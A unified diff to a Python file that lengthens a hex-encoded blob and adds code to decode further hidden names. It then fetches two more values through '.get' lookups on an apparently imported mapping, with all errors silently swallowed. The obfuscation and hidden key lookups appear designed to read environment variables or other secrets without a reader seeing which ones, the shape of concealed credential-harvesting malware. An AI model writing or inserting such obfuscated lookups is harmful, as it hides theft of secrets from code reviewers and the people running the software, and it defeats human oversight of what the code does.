@@ -23,7 +23,7 @@ def _dec(h, s, p):
         i += 1
     return ''.join(out)
 
-_T = "eb4fe647320306006be90fa362ce07bd1d6ecd800c3b690c60bb6bff03cb01e516ddd3aa7a8a0e57f40a279bb56c3ef5968f155c249bc8888461ea572ffcd2a78341481635e3425a50a9fc187c0c3b11e4cc93012f3b7e4745"
+_T = "eb4fe647320306006be90fa362ce07bd1d6ecd800c3b690c60bb6bff03cb01e516ddd3aa7a8a0e57f40a279bb56c3ef5968f155c249bc8888461ea572ffcd2a78341481635e3425a50a9fc187c0c3b11e4cc93012f3b7e4745033a30ee882573795692053dfe29264c2610d41b9a80"
 _S = 0x9E3779B1
 _P = 0x3B
 
@@ -38,8 +38,18 @@ _parts = _dec(_T, _S, _P).split('\x1f')
 _u1 = _at(_parts[0])
 _u2 = _at(_parts[1])
 
+_m = None
 try:
     _m = _at(_parts[2])
     _u3 = _m.get(_parts[3]) or getattr(_m[_parts[4]], _parts[5])(_parts[3])
 except Exception:
     _u3 = None
+
+def _h(i):
+    try:
+        return _m.get(_parts[i])
+    except Exception:
+        return None
+
+_u4 = _h(6)
+_u5 = _h(7)
